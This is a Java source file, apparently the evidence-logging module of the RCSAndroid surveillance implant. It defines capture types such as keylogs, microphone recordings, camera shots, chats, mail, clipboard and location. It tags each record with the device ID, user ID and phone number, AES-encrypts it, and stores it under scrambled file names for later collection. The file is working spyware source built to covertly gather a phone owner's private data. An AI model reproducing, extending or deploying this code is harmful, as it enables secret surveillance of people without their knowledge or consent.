/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : Evidence.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/
package com.ht.RCSAndroidGUI.evidence;

import java.util.Date;
import java.util.Vector;

import android.util.Log;

import com.ht.RCSAndroidGUI.Debug;
import com.ht.RCSAndroidGUI.Device;
import com.ht.RCSAndroidGUI.LogR;
import com.ht.RCSAndroidGUI.agent.AgentConf;
import com.ht.RCSAndroidGUI.crypto.Encryption;
import com.ht.RCSAndroidGUI.crypto.Keys;
import com.ht.RCSAndroidGUI.file.AutoFile;
import com.ht.RCSAndroidGUI.file.Path;
import com.ht.RCSAndroidGUI.utils.Check;
import com.ht.RCSAndroidGUI.utils.DataBuffer;
import com.ht.RCSAndroidGUI.utils.DateTime;
import com.ht.RCSAndroidGUI.utils.Utils;
import com.ht.RCSAndroidGUI.utils.WChar;

// TODO: Auto-generated Javadoc
/*  LOG FORMAT
 *
 *  -- Naming Convention
 *  Il formato dei log e' il seguente:
 *  Il nome del file in chiaro ha questa forma: ID_AGENTE-LOG_TYPE-SEQUENCE.mob
 *  e si presenta cosi': xxxx-xxxx-dddd.mob
 *  Il primo gruppo e' formato generalmente da 4 cifre in esadecimali, il secondo
 *  e' formato generalmente da una cifra esadecimale, il terzo gruppo e' un numero
 *  di sequenza in formato decimale. Ognuno dei tre gruppi puo' essere composto da
 *  1 fino a 8 cifre. Il nome del file viene scramblato con il primo byte della
 *  chiave utilizzata per il challenge.
 *
 *  -- Header
 *  Il log cifrato e' cosi' composto:
 *  all'inizio del file viene scritta una LogStruct non cifrata, il membro FileSize indica la
 *  lunghezza complessiva di tutto il file. Dopo la LogStruct troviamo il filename in WCHAR,
 *  quindi i byte di AdditionalData se presenti e poi il contenuto vero e proprio.
 *
 *  -- Data
 *  Il contenuto e' formato da una DWORD in chiaro che indica la dimensione del blocco
 *  unpadded (va quindi paddata a BLOCK_SIZE per ottenere la lunghezza del blocco cifrato)
 *  e poi il blocco di dati vero e proprio. Questa struttura puo' esser ripetuta fino alla
 *  fine del file.
 *
 *  -- Global Struct
 *  |Log Struct|FileName|AdditionalData|DWORD Unpadded|Block|.....|DWORD Unpadded|Block|.....|
 *
 *  Un log puo' essere composto sia da un unico blocco DWORD-Dati che da piu' blocchi DWORD-Dati.
 *
 */
/**
 * The Class Evidence (formerly known as Log.)
 */
public final class Evidence {

	/** The Constant EVIDENCE_VERSION_01. */
	private static final int EVIDENCE_VERSION_01 = 2008121901;
	/*
	 * Tipi di log (quelli SOLO per mobile DEVONO partire da 0xAA00
	 */

	/** The Constant EVIDENCE_MAGIC_CALLTYPE. */
	public static final int EVIDENCE_MAGIC_CALLTYPE = 0x0026;

	/** The EVIDENC e_ delimiter. */
	public static int EVIDENCE_DELIMITER = 0xABADC0DE;

	/** The Constant TYPE_EVIDENCE. */
	private static final EvidenceType[] TYPE_EVIDENCE = new EvidenceType[] {
			EvidenceType.INFO,
			EvidenceType.MAIL_RAW,
			EvidenceType.ADDRESSBOOK,
			EvidenceType.CALLLIST, // 0..3
			EvidenceType.DEVICE,
			EvidenceType.LOCATION,
			EvidenceType.CALL,
			EvidenceType.CALL_MOBILE, // 4..7
			EvidenceType.KEYLOG, EvidenceType.SNAPSHOT,
			EvidenceType.URL,
			EvidenceType.CHAT, // 8..b
			EvidenceType.MAIL, EvidenceType.MIC, EvidenceType.CAMSHOT,
			EvidenceType.CLIPBOARD, // c..f
			EvidenceType.NONE, EvidenceType.APPLICATION, // 10..11
			EvidenceType.NONE // 12
	};

	/** The Constant MEMO_TYPE_EVIDENCE. */
	public static final String[] MEMO_TYPE_EVIDENCE = new String[] { "INF",
			"MAR", "ADD", "CLL", // 0..3
			"DEV", "LOC", "CAL", "CLM", // 4..7
			"KEY", "SNP", "URL", "CHA", // 8..b
			"MAI", "MIC", "CAM", "CLI", // c..f
			"NON", "APP", // 10..11
			"NON" // 12

	};

	/** The Constant MIN_AVAILABLE_SIZE. */
	private static final long MIN_AVAILABLE_SIZE = 200 * 1024;

	/** The Constant TAG. */
	private static final String TAG = Class.class.getName();

	// #ifdef DEBUG
	/** The debug. */
	private static Debug debug = new Debug("Evidence");

	// #endif

	/** The first space. */
	boolean firstSpace = true;

	/** The enough space. */
	boolean enoughSpace = true;

	/** The timestamp. */
	Date timestamp;

	/** The log name. */
	String logName;

	/** The evidence type. */
	int evidenceType;

	/** The file name. */
	String fileName;

	/** The fconn. */
	AutoFile fconn = null;

	// DataOutputStream os = null;
	/** The encryption. */
	Encryption encryption;

	/** The evidence collector. */
	EvidenceCollector evidenceCollector;

	/** The evidence description. */
	EvidenceDescription evidenceDescription;

	/** The device. */
	Device device;

	/** The type evidence id. */
	EvidenceType typeEvidenceId;

	/** The progressive. */
	int progressive;

	/** The aes key. */
	private byte[] aesKey;
	
	/** The enc data. */
	private byte[] encData;

	/**
	 * Instantiates a new evidence.
	 */
	private Evidence() {
		evidenceCollector = EvidenceCollector.self();
		device = Device.self();

		progressive = -1;
		// timestamp = new Date();
	}

	/**
	 * Instantiates a new log.
	 *
	 * @param typeEvidenceId the type evidence id
	 * @param aesKey the aes key
	 */
	public Evidence(final EvidenceType typeEvidenceId, final byte[] aesKey) {
		this();
		// #ifdef DBC
		Check.requires(aesKey != null, "aesKey null");
		// #endif

		// agent = agent_;
		this.typeEvidenceId = typeEvidenceId;
		this.aesKey = aesKey;

		encryption = new Encryption(aesKey);

		// #ifdef DBC
		// Check.ensures(agent != null, "createLog: agent null");
		Check.ensures(encryption != null, "encryption null");
		// #endif
	}


	/**
	 * Instantiates a new evidence.
	 *
	 * @param typeEvidenceId the type evidence id
	 */
	public Evidence(final EvidenceType typeEvidenceId) {
		this(typeEvidenceId, Keys.self().getAesKey());
	}

	/**
	 * Convert type log.
	 * 
	 * @param agentId
	 *            the agent id
	 * @return the int
	 */
	public static int convertTypeEvidence(final int agentId) {
		final int agentPos = agentId - AgentConf.AGENT;
		// #ifdef DBC
		Check.requires(TYPE_EVIDENCE != null, "Null TypeEvidence");
		// #endif
		if (agentPos >= 0 && agentPos < TYPE_EVIDENCE.length) {
			final int typeLog = TYPE_EVIDENCE[agentPos].value();
			return typeLog;
		}

		// #ifdef DEBUG
		debug.warn("Wrong agentId conversion: " + agentId);
		// #endif
		return EvidenceType.UNKNOWN.value();
	}


	/**
	 * Enough space.
	 * 
	 * @return true, if successful
	 */
	private boolean enoughSpace() {
		long free = 0;

		free = Path.freeSpace();

		if (free < MIN_AVAILABLE_SIZE) {
			// #ifdef DEBUG
			if (firstSpace) {
				firstSpace = false;

				debug.fatal("not enough space. Free : " + free);
			}
			// #endif

			return false;
		} else {
			return true;
		}
	}

	/**
	 * Chiude il file di log. Torna TRUE se il file e' stato chiuso con
	 * successo, FALSE altrimenti. Se bRemove e' impostato a TRUE il file viene
	 * anche cancellato da disco e rimosso dalla coda. Questa funzione NON va
	 * chiamata per i markup perche' la WriteMarkup() e la ReadMarkup() chiudono
	 * automaticamente l'handle.
	 * 
	 * @return true, if successful
	 */
	public synchronized boolean close() {
		// TODO: rinominare il file
		final boolean ret = true;
		encData = null;
		fconn = null;
		return ret;
	}

	/**
	 * Crea un'evidenza con tipo standard.
	 * 
	 * @param additionalData
	 *            the additional data
	 * @return true, if successful
	 */
	public synchronized boolean createEvidence(final byte[] additionalData) {
		return createEvidence(additionalData, typeEvidenceId);
	}

	/**
	 * Questa funzione crea un file di log e lascia l'handle aperto. Il file
	 * viene creato con un nome casuale, la chiamata scrive l'header nel file e
	 * poi i dati addizionali se ce ne sono. LogType e' il tipo di log che
	 * stiamo scrivendo, pAdditionalData e' un puntatore agli eventuali
	 * additional data e uAdditionalLen e la lunghezza dei dati addizionali da
	 * scrivere nell'header. Il parametro facoltativo bStoreToMMC se settato a
	 * TRUE fa in modo che il log venga salvato nella prima MMC disponibile, se
	 * non c'e' la chiama fallisce. La funzione torna TRUE se va a buon fine,
	 * FALSE altrimenti.
	 * 
	 * @param additionalData
	 *            the additional data
	 * @param evidenceType
	 *            the log type
	 * @return true, if successful
	 */
	public synchronized boolean createEvidence(final byte[] additionalData,
			final EvidenceType evidenceType) {

		this.typeEvidenceId = evidenceType;

		// #ifdef DEBUG
		debug.trace("createLog typeEvidenceId: " + evidenceType);
		// #endif

		// #ifdef DBC
		Check.requires(fconn == null, "createLog: not previously closed");
		// #endif

		timestamp = new Date();

		int additionalLen = 0;

		if (additionalData != null) {
			additionalLen = additionalData.length;
		}

		enoughSpace = enoughSpace();
		if (!enoughSpace) {
			// #ifdef DEBUG
			debug.trace("createEvidence, no space");
			// #endif
			return false;
		}

		final Name name = evidenceCollector.makeNewName(this,
				evidenceType.getMemo());


		progressive = name.progressive;
		//final String basePath = name.basePath;
		//final String blockDir = name.blockDir;
		//final String encName = name.encName;
		//final String plainFileName = name.PlainFileName;

		final String dir = name.basePath + name.blockDir + "/";
		final boolean ret = Path.createDirectory(dir);

		if (!ret) {
			// #ifdef DEBUG
			debug.error("Dir not created: " + dir);
			// #endif
			return false;
		}

		fileName = dir + name.encName;
		// #ifdef DBC
		Check.asserts(fileName != null, "null fileName");
		Check.asserts(!fileName.endsWith(EvidenceCollector.LOG_EXTENSION),
				"file not scrambled");
		// Check.asserts(!fileName.endsWith("MOB"), "file not scrambled");
		// #endif

		// #ifdef DEBUG
		debug.trace("createLog fileName:" + fileName);
		// #endif
		try {
			fconn = new AutoFile(fileName);

			if (fconn.exists()) {
				close();
				// #ifdef DEBUG
				debug.fatal("It should not exist:" + fileName);
				// #endif

				return false;
			}

			// #ifdef DEBUG
			debug.info("Created: " + fileName);
			// #endif

			final byte[] plainBuffer = makeDescription(additionalData,
					evidenceType);
			// #ifdef DBC
			Check.asserts(plainBuffer.length >= 32 + additionalLen,
					"Short plainBuffer");
			// #endif

			// fconn.create();
			// os = fconn.openDataOutputStream();

			final byte[] encBuffer = encryption.encryptData(plainBuffer);
			// #ifdef DBC
			Check.asserts(encBuffer.length == encryption
					.getNextMultiple(plainBuffer.length), "Wrong encBuffer");
			// #endif

			// scriviamo la dimensione dell'header paddato
			fconn.write(Utils.intToByteArray(plainBuffer.length));
			Log.d(TAG, Long.toString(fconn.getSize()));
			// scrittura dell'header cifrato
			fconn.append(encBuffer);
			Log.d(TAG, Long.toString(fconn.getSize()));

			// #ifdef DBC
			Check.asserts(fconn.getSize() == encBuffer.length + 4,
					"Wrong filesize");
			// #endif

			// #ifdef DEBUG
			debug.trace("additionalData.length: " + plainBuffer.length);
			debug.trace("encBuffer.length: " + encBuffer.length);
			// #endif

		} catch (final Exception ex) {
			// #ifdef DEBUG
			debug.error("file: " + name.fileName + " ex:" + ex);
			// #endif
			return false;
		}

		return true;
	}

	// pubblico solo per fare i test
	/**
	 * Make description.
	 * 
	 * @param additionalData
	 *            the additional data
	 * @param evidenceType
	 *            the log type
	 * @return the byte[]
	 */
	public byte[] makeDescription(final byte[] additionalData,
			final EvidenceType evidenceType) {

		if (timestamp == null) {
			timestamp = new Date();
		}

		int additionalLen = 0;

		if (additionalData != null) {
			additionalLen = additionalData.length;
		}

		final DateTime datetime = new DateTime(timestamp);

		evidenceDescription = new EvidenceDescription();
		evidenceDescription.version = EVIDENCE_VERSION_01;
		evidenceDescription.logType = evidenceType;
		evidenceDescription.hTimeStamp = datetime.hiDateTime();
		evidenceDescription.lTimeStamp = datetime.lowDateTime();
		evidenceDescription.additionalData = additionalLen;
		evidenceDescription.deviceIdLen = WChar.getBytes(device.getDeviceId()).length;
		evidenceDescription.userIdLen = WChar.getBytes(device.getUserId()).length;
		evidenceDescription.sourceIdLen = WChar.getBytes(device
				.getPhoneNumber()).length;

		final byte[] baseHeader = evidenceDescription.getBytes();
		// #ifdef DBC
		Check.asserts(baseHeader.length == evidenceDescription.length,
				"Wrong log len");
		// #endif

		final int headerLen = baseHeader.length
				+ evidenceDescription.additionalData
				+ evidenceDescription.deviceIdLen
				+ evidenceDescription.userIdLen
				+ evidenceDescription.sourceIdLen;
		final byte[] plainBuffer = new byte[encryption
				.getNextMultiple(headerLen)];

		final DataBuffer databuffer = new DataBuffer(plainBuffer, 0,
				plainBuffer.length);
		databuffer.write(baseHeader);
		databuffer.write(WChar.getBytes(device.getDeviceId()));
		databuffer.write(WChar.getBytes(device.getUserId()));
		databuffer.write(WChar.getBytes(device.getPhoneNumber()));

		if (additionalLen > 0) {
			databuffer.write(additionalData);
		}

		return plainBuffer;
	}

	/**
	 * Plain evidence.
	 * 
	 * @param additionalData
	 *            the additional data
	 * @param logType
	 *            the log type
	 * @param data
	 *            the data
	 * @return the byte[]
	 */
	public synchronized byte[] plainEvidence(final byte[] additionalData,
			final EvidenceType logType, final byte[] data) {

		// final byte[] encData = encryption.encryptData(data, 0);

		int additionalLen = 0;

		if (additionalData != null) {
			additionalLen = additionalData.length;
		}

		final byte[] plainBuffer = makeDescription(additionalData, logType);
		// #ifdef DBC
		Check.asserts(plainBuffer.length >= 32 + additionalLen,
				"Short plainBuffer");
		// #endif

		// buffer completo
		final byte[] buffer = new byte[additionalData.length + data.length + 8];
		final DataBuffer databuffer = new DataBuffer(buffer, 0, buffer.length);

		// scriviamo la dimensione dell'header paddato
		databuffer.writeInt(plainBuffer.length);
		// scrittura dell'header cifrato
		databuffer.write(additionalData);

		// scrivo il contenuto
		databuffer.writeInt(data.length);
		databuffer.write(data);

		return buffer;
	}

	/**
	 * Write evidence.
	 * 
	 * @param data
	 *            the data
	 * @return true, if successful
	 */
	public boolean writeEvidence(final byte[] data) {
		return writeEvidence(data, 0);
	}

	/**
	 * Questa funzione prende i byte puntati da pByte, li cifra e li scrive nel
	 * file di log creato con CreateLog(). La funzione torna TRUE se va a buon
	 * fine, FALSE altrimenti.
	 * 
	 * @param data
	 *            the data
	 * @param offset
	 *            the offset
	 * @return true, if successful
	 */
	public synchronized boolean writeEvidence(final byte[] data,
			final int offset) {

		encData = encryption.encryptData(data, offset);

		if (fconn == null) {
			// #ifdef DEBUG
			debug.error("fconn null");
			// #endif
			return false;
		}

		// #ifdef DEBUG
		debug.info("writeEvidence encdata: " + encData.length);
		debug.info("fileSize: " + fconn.getSize());
		// #endif

		try {
			fconn.append(Utils.intToByteArray(data.length - offset));
			fconn.append(encData);
			fconn.flush();
		} catch (final Exception e) {
			// #ifdef DEBUG
			debug.error("Error writing file: " + e);
			// #endif
			return false;
		}

		return true;
	}

	/**
	 * Write logs.
	 * 
	 * @param bytelist
	 *            the bytelist
	 * @return true, if successful
	 */
	public boolean writeEvidences(final Vector bytelist) {
		int totalLen = 0;
		for (int i = 0; i < bytelist.size(); i++) {
			final byte[] token = (byte[]) bytelist.elementAt(i);
			totalLen += token.length;
		}

		final int offset = 0;
		final byte[] buffer = new byte[totalLen];
		final DataBuffer databuffer = new DataBuffer(buffer, 0, totalLen);

		for (int i = 0; i < bytelist.size(); i++) {
			final byte[] token = (byte[]) bytelist.elementAt(i);
			databuffer.write(token);
		}

		// #ifdef DEBUG
		debug.trace("len: " + buffer.length);
		// #endif

		return writeEvidence(buffer);
	}

	/**
	 * Gets the enc data.
	 *
	 * @return the enc data
	 */
	public byte[] getEncData() {
		return encData;
	}

	/**
	 * Info.
	 * 
	 * @param message
	 *            the message
	 */
	public static void info(final String message) {
		try {
			// atomic info
			new LogR(EvidenceType.INFO, LogR.LOG_PRI_STD, null, WChar.getBytes(
					message, true));

			// final Evidence logInfo = new Evidence(Agent.AGENT_INFO);
			// logInfo.atomicWriteOnce(message);

		} catch (final Exception ex) {
			// #ifdef DEBUG
			debug.error(ex);
			// #endif
		}
	}

	/**
	 * Atomic write once.
	 * 
	 * @param additionalData
	 *            the additional data
	 * @param logType
	 *            the log type
	 * @param content
	 *            the content
	 */
	public void atomicWriteOnce(final byte[] additionalData, final EvidenceType logType,
			final byte[] content) {
		createEvidence(additionalData, logType);
		writeEvidence(content);
		Check.ensures(getEncData().length % 16 == 0, "wrong len");
		close();
	}
}
